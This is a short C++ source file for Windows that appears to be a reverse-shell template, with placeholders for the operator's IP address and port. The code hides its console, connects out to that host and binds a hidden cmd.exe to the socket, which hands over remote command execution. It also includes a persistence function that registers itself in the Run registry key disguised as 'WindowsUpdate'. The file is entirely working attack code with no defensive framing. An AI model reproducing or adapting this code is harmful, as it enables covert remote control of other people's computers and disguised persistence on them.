#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in R;
STARTUPINFOA A;
PROCESS_INFORMATION B;

const char* IP_ADDRESS = "IPADDRSELECT";
const int PORT = PORTSELECT;

void addToRegistryRun() {
    HKEY hKey;
    if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        wchar_t moduleName[MAX_PATH];
        GetModuleFileNameW(NULL, moduleName, MAX_PATH);
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (const BYTE*)moduleName, (wcslen(moduleName) + 1) * 2);
        RegCloseKey(hKey);
    }
}

int main() {
    FreeConsole();

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    R.sin_family = AF_INET;
    R.sin_port = htons(PORT);
    R.sin_addr.s_addr = inet_addr(IP_ADDRESS);

    WSAConnect(s1, (SOCKADDR*)&R, sizeof(R), 0, 0, 0, 0);
    memset(&A, 0, sizeof(A));
    A.cb = sizeof(A);
    A.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    A.hStdInput = A.hStdOutput = A.hStdError = (HANDLE)s1;

    char c[256] = "cmd.exe";  // Используйте char вместо wchar_t

    CreateProcessA(NULL, c, 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &A, &B);  // Используйте CreateProcessA

    return 0;
}
